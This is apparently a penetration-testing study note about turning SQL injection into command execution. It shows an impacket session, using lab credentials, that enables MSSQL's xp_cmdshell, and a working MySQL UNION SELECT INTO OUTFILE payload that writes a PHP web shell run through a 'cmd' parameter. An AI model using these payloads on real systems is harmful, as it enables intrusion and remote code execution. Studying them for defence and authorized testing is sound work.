Depending on the operating system, service privileges, and filesystem permissions, SQL injection vulnerabilities can be used to read and write files on the underlying operating system.

## Manual Code Execution with MSSQL

In Microsoft SQL Server, the [_xp_cmdshell_](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) function takes a string and passes it to a command shell for execution. The function returns any output as rows of text. The function is disabled by default and, once enabled, it must be called with the **EXECUTE** keyword instead of SELECT.

SQL injection can be simulated with the impacket-mssqlclient tool, then used to enable and use xp_cmdshell

```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```

After logging in from our Kali VM to the MSSQL instance, we can enable _show advanced options_ by setting its value to 1, then applying the changes to the running configuration via the **RECONFIGURE** statement. Next, we'll enable _xp_cmdshell_ and apply the configuration again using **RECONFIGURE**.

With this feature enabled, we can execute any Windows shell command through the **EXECUTE** statement followed by the feature name.

## Manual Code Execution with MySQL

no single function that can escalate to a full-blown RCE :(

SELECT INTO_OUTFILE can be abused to write files to the web server.
note: For this attack to work, the file location must be writable to the OS user running the database software.

We'll issue the **UNION SELECT** SQL keywords to include a single PHP line into the first column and save it as **webshell.php** in a writable web folder.

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

a TypeError is to be expected.

going to http://exampleurl/tmp/webshell.php?cmd=id will execute the id command if the write was successful.

